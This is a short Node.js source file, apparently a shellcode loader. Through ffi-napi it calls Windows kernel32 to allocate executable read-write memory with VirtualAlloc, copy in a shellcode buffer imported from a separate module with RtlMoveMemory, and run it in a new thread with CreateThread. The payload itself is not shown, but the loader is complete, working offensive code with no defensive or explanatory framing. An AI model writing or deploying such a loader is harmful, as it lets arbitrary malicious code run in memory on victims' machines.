const ffi = require('ffi-napi');
const ref = require("ref-napi");
const {shellcode} = require("./shellcode")

console.log(shellcode.length)

const SIZE_T = ref.types.uint64;
const DWORD = ref.types.uint32;
const VOID = ref.types.void;
const LPVOID = ref.refType(VOID);
const HANDLE = LPVOID;
const LPDWORD = ref.refType(DWORD);

const kernel32 = new ffi.Library('kernel32', {
    // [LPVOID destAddress, [
    //     LPVOID  lpAddress,
    //     SIZE_T  dwSize,
    //     DWORD   flAllocationType,
    //     DWORD   flProtect,
    //   ]
    // ]
    'VirtualAlloc': [LPVOID, [LPVOID, SIZE_T, DWORD, DWORD]],
    // [VOID, [
    //     LPVOID  Destination, // OUT
    //     LPVOID  Source,
    //     SIZE_T  Length,
    //   ]
    // ]
    'RtlMoveMemory': [VOID, [LPVOID, LPVOID, SIZE_T]],
    // [HANDLE threadHandle, [
    //     LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    //     SIZE_T                  dwStackSize,
    //     LPTHREAD_START_ROUTINE  lpStartAddress,
    //     LPVOID                  lpParameter,
    //     DWORD                   dwCreationFlags,
    //     LPDWORD                 lpThreadId,         // OUT
    //   ]
    // ]
    'CreateThread': [HANDLE, ['pointer', SIZE_T, LPVOID, 'pointer', DWORD, LPDWORD]],
    // [DWORD ret,[
    //     HANDLE hHandle,
    //     DWORD  dwMilliseconds,
    //   ]
    // ]
    'WaitForSingleObject': [DWORD, [HANDLE, DWORD]],
});

console.log("shellcode length:", shellcode.length);

const destAddr = kernel32.VirtualAlloc(null, shellcode.length, 0x3000, 0x40)

console.log(destAddr)

kernel32.RtlMoveMemory(destAddr, shellcode, shellcode.length)

const threadId = ref.alloc(ref.refType(ref.types.uint32))

const handle = kernel32.CreateThread(null, 0, destAddr, null, 0, threadId)

console.log('thread id:', threadId.readUint32LE())

kernel32.WaitForSingleObject(handle, 0xffffffff)


